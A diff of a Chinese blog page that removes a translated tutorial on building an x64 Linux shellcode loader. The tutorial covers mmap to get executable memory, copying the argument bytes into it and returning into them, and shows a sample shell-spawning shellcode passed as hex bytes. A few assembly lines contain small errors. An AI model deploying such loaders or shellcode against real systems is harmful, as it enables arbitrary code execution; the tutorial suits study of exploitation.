@@ -2298,201 +2447,6 @@ startup:</span>
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/exploit/2015/03/16/shellcodeloaders/" itemprop="url">
-                  Shellcode/Loaders
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2015-03-16T00:00:00+08:00" content="2015-03-16">
-              2015-03-16
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/exploit/" itemprop="url" rel="index">
-                    <span itemprop="name">exploit</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/exploit/2015/03/16/shellcodeloaders/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/16/shellcodeloaders/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <p>意译：<a href="http://blackhat.life/Shellcode_Loaders" target="_blank" rel="external">Shellcode/Loaders</a></p>
-<p>shellcode Loader被用在缓冲区溢出或者其它形式的二进制挖掘活动中测试shellcode。最好的方法嘛，构建从命令行参数的用户友好的loader，并且传递给刚分配的可执行内存空间。本文在x86指令集写x64汇编来在linux上构建这么个载入器。</p>
-<p>32位的在文末给出</p>
-<p>[TOC]</p>
-<h2 id="可执行loader">可执行loader</h2><h3 id="命令行参数">命令行参数</h3><p>命令行参数入栈的顺序是：第二个参数，第一个参数，参数数目。因此，为了从参数获得shellcode，<code>pop rbx</code>三次。一旦完成，<code>rbx</code>将包含指向shellcode的指针：</p>
-<pre><code><span class="built_in">BITS</span> <span class="number">64</span>
-<span class="built_in">global</span> _start
-<span class="label">_start:</span>
-    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">;argc</span>
-    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">; 参数列表指针</span>
-    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">; 指向第一个参数的指针</span>
-</code></pre><h3 id="通过mmap()分配可执行内存区域">通过mmap()分配可执行内存区域</h3><p>参考x64 syscall table，自己谷歌就好。</p>
-<p>现代操作系统的栈默认并不可执行，但我们成功执行代码需要一个可执行栈。这可以通过mmap系统调用实现。</p>
-<p><code>mmap()</code>的原型是(<code>man mmap</code>)：</p>
-<pre><code><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, size_t length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,
-                 <span class="keyword">int</span> fd, off_t offset)</span></span>;
-</code></pre><p>在64位处理器上，函数调用如下：</p>
-<pre><code>function_call(<span class="variable">%rax</span>) = function(<span class="variable">%rdi</span>,  <span class="variable">%rsi</span>,  <span class="variable">%rdx</span>,  <span class="variable">%r10</span>,  <span class="variable">%r8</span>,  <span class="variable">%r9</span>)
-              ^<span class="keyword">system</span>          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
-               call <span class="comment">#</span>
-</code></pre><p>首先，<code>mmap()</code>的系统调用数(syscall number)放入<code>rax</code>：</p>
-<pre><code><span class="keyword">push</span> <span class="number">0x9</span>
-<span class="keyword">pop</span> <span class="literal">rax</span>
-</code></pre><p><code>mmap()</code>的第一个参数需要是<code>null</code>，所以<code>xor rdi rdi</code>。</p>
-<pre><code><span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
-</code></pre><p>指定缓冲区大小(4096字节或者0x1000字节) ，这个参数传给<code>rsi</code></p>
-<pre><code><span class="keyword">push</span> <span class="literal">rdi</span>
-<span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; rsi = 0</span>
-<span class="keyword">inc</span> <span class="literal">rsi</span> <span class="comment">; rsi = 1</span>
-<span class="keyword">shl</span> <span class="literal">rsi</span>, <span class="number">0xc</span>  <span class="comment">; rsi=0x1000</span>
-</code></pre><p>第三个参数<code>prot</code>保存在<code>rdx</code>中，是内核权限标志(读、写、执行或无)，对多个标志，它们用按位或方式合在一起，<code>PROT_READ|PROT_WRITE|PROT_EXEC</code>是数字<code>7</code>,所以直接在<code>rdx</code>中放入7就行。</p>
-<pre><code><span class="keyword">push</span> <span class="number">0x7</span>
-<span class="keyword">pop</span> <span class="literal">rdx</span>
-</code></pre><p>接下来的参数<code>flag</code>跟<code>prot</code>类似，保存了内存映射标志。本例中设置为<code>MAP_PRIVATE|MAP_ANONYMOUS</code>，其值为数字<code>0x22</code>。存储在<code>r10</code>中。</p>
-<pre><code><span class="keyword">push </span><span class="number">0x22</span>
-<span class="keyword">pop </span><span class="literal">r10</span>
-</code></pre><p>最后两个参数应该为<code>null</code>，放到<code>r8</code>和<code>r9</code>中</p>
-<pre><code><span class="keyword">push</span> <span class="literal">rdi</span>
-<span class="keyword">push</span> <span class="literal">rdi</span>
-<span class="keyword">pop</span> <span class="literal">r8</span>
-<span class="keyword">pop</span> <span class="literal">r9</span>
-</code></pre><p>万事具备，进行系统调用。</p>
-<pre><code><span class="keyword">syscall</span>
-</code></pre><p>接下来<code>rax</code>中就包含指向缓冲区的指针，这个指针可以用来把shellcode拷贝进去。</p>
-<h3 id="拷贝代码到新内存区域">拷贝代码到新内存区域</h3><p>把<code>rsi</code>作为计数器，初始化为0：</p>
-<pre><code>inject：
-    <span class="keyword">xor</span> <span class="literal">rsi</span>, <span class="literal">rsi</span>
-</code></pre><p>把<code>rdi</code>设为<code>null</code>，等下要把当前字节和<code>dil</code>(rdi低8位)中的值比较来确定shellcode的结束位置。</p>
-<pre><code><span class="keyword">push</span> <span class="literal">rsi</span>
-<span class="keyword">pop</span> <span class="literal">rdi</span>
-</code></pre><p>如果拷贝到达shellcode末尾，则跳到<code>inject_finished</code>：</p>
-<pre><code><span class="label">inject_loop:</span>
-    <span class="keyword">cmp</span> [<span class="literal">rbx</span> + <span class="literal">rsi</span> * <span class="number">1</span>], <span class="literal">dil</span>
-    <span class="keyword">je</span> inject_finished
-</code></pre><p>每个字节从<code>[rbx + rsi]</code>移动到<code>[rax + rsi]</code>，通过<code>r10b</code>(<code>r10</code>低八位)。</p>
-<pre><code><span class="keyword">mov</span> <span class="literal">r10b</span>, [<span class="literal">rbx</span>+<span class="literal">rsi</span>*<span class="number">1</span>]
-<span class="keyword">mov</span> [<span class="literal">rax</span>+<span class="literal">rsi</span>*<span class="number">1</span>], <span class="literal">r10b</span>
-</code></pre><p><code>rsi</code>作为偏移量和计数器：</p>
-<pre><code><span class="keyword">inc</span> <span class="literal">rsi</span>
-</code></pre><p>继续循环</p>
-<pre><code><span class="keyword">jmp</span> inject_loop:
-</code></pre><p>在<code>inject_finished</code>程序出附上<code>ret</code>操作符(opcode)<code>0xc3</code></p>
-<pre><code><span class="label">inject_finished:</span>
-    <span class="keyword">mov</span> <span class="preprocessor">byte</span> [<span class="literal">rax</span>+<span class="literal">rsi</span>*<span class="number">1</span>], <span class="number">0xc3</span>
-</code></pre><p>一般，操作符(opcode)指指令而字节码(bytecode)不仅包含操作符还包含参数，成为操作数(operand)。</p>
-<h3 id="返回代码">返回代码</h3><p>代码返回而不是跳转或被调用的原因在于，这更充分模拟了类似有漏洞应用在缓冲区溢出时的环境。有效载荷会返回，因此，当shellcode被加载后，它应该返回。</p>
-<p>首先调用<code>ret_to_shellcode</code>。这会把<code>exit</code>的地址推入栈顶，于是shellcode结束后返回<code>exit</code>的地址。</p>
-<pre><code><span class="built_in">call</span> ret_to_shellcode
-</code></pre><p>原始的返回地址被覆盖为为shellcode的地址，并且进入(returned into)</p>
-<pre><code><span class="label">ret_to_shellcode:</span>
-    <span class="keyword">push</span> rax
-    <span class="keyword">ret</span>
-</code></pre><p>当shellcode结束时，将返回到<code>exit</code>函数优雅的退出</p>
-<pre><code>exit：
-    <span class="keyword">push</span> <span class="number">60</span>
-    <span class="keyword">pop</span> <span class="literal">rax</span>
-    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
-    <span class="keyword">syscall</span>
-</code></pre><h3 id="执行loader">执行loader</h3><p>编译链接吧</p>
-<pre><code> <span class="special">~</span>/Work/project/blackhat/shellcode  nasm -felf64 loader64.s -o loader64.o
- <span class="special">~</span>/Work/project/blackhat/shellcode  ld loader64.o -o loader64
- <span class="special">~</span>/Work/project/blackhat/shellcode  ./loader64 <span class="formula">$(echo -en "<span class="command">\x</span>48<span class="command">\x</span>31<span class="command">\xff</span><span class="command">\x</span>6a<span class="command">\x</span>69<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05<span class="command">\x</span>57<span class="command">\x</span>57<span class="command">\x</span>5e<span class="command">\x</span>5a<span class="command">\x</span>48<span class="command">\xbf</span><span class="command">\x</span>6a<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>73<span class="command">\x</span>68<span class="command">\x</span>48<span class="command">\xc</span>1<span class="command">\xef</span><span class="command">\x</span>08<span class="command">\x</span>57<span class="command">\x</span>54<span class="command">\x</span>5f<span class="command">\x</span>6a<span class="command">\x</span>3b<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05")
-<span class="special">[</span>reverland@gentoo shellcode<span class="special">]</span>$</span>
-</code></pre><p>这个shellcode来自之前启动一个shell的shellcode，注意提示符。</p>
-<h2 id="基于返回的载入器">基于返回的载入器</h2><p>基于返回的代码也能用载入器测试，而且更小，不需要分配内存。</p>
-<pre><code><span class="label">_start:</span>
-    <span class="keyword">pop</span> <span class="literal">rbx</span>
-    <span class="keyword">pop</span> <span class="literal">rbx</span>
-    <span class="keyword">pop</span> <span class="literal">rsp</span> <span class="comment">; rsp现在指向第一个参数</span>
-    <span class="keyword">ret</span>
-</code></pre><p>只是我觉得，似乎参数位置是不可执行的。关于ROP，以后说吧</p>
-<p>最后还有些动态载入和动态socket载入器。当shellcode依赖有漏洞二进制程序上下文时包含一个链接的动态部分，这是啥我现在还不知道。。。。。。</p>
-<p>下一篇<a href="http://blackhat.life/Shellcode/Dynamic" target="_blank" rel="external">Dynamic shellcode</a></p>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
 
   </section>
 
@@ -2539,7 +2493,7 @@ startup:</span>
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">175</span>
+              <span class="site-state-item-count">176</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -2553,7 +2507,7 @@ startup:</span>
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">61</span>
+              <span class="site-state-item-count">62</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
@@ -2673,7 +2627,7 @@ startup:</span>
         <div class="copyright" >
   
   &copy;  2011 - 
-  <span itemprop="copyrightYear">2015</span>
+  <span itemprop="copyrightYear">2016</span>
   <span class="with-love">
     <i class="icon-next-heart fa fa-heart"></i>
   </span>
